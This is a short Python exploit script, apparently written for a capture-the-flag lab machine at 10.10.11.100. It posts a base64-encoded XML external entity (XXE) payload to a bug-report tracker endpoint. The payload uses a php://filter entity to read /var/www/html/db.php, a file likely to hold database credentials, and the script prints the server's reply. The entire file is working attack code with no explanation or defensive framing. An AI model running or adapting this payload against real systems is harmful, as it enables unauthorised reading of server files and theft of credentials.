#!/usr/bin/python3

import requests
import base64

def xxe(url, endpoint):

	payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE foo [ <!ENTITY bigb0ss SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">]>  
           <bugreport>  
           <title>no</title>  
           <cwe>no</cwe>  
           <cvss>no</cvss>  
           <reward>&bigb0ss;</reward>  
           </bugreport>"""

	payload_bytes = payload.encode('ascii')
	payload_b64enc = base64.b64encode(payload_bytes)
	payload_b64 = payload_b64enc.decode('ascii')

	#print(payload_b64)

	data = {
		"data": payload_b64,
	}

	r = requests.post(url + endpoint, data=data)

	#print(r.status_code)
	print(r.text)

	return


if __name__ == '__main__':
	url = "http://10.10.11.100"
	endpoint = "/tracker_diRbPr00f314.php"

	xxe(url, endpoint)